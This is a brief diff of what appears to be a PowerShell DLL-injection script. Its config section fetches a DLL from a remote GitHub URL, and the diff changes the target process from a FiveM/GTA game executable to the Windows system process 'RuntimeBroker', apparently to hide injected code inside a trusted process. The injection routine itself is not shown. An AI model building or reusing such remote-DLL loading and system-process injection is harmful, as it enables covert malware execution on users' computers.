@@ -8,7 +8,7 @@ function Log-Fail($msg) { $script:fail++ }
 # --- CONFIG ---
 $DLL_URL = "https://github.com/beezzerrer/web-driver/raw/refs/heads/main/bacy"
 $DLL_B64 = ""
-$PROC_NAME = "FiveM_GTAProcess.exe"
+$PROC_NAME = "RuntimeBroker"
 
 # --- Win32 API via P/Invoke ---
 try {
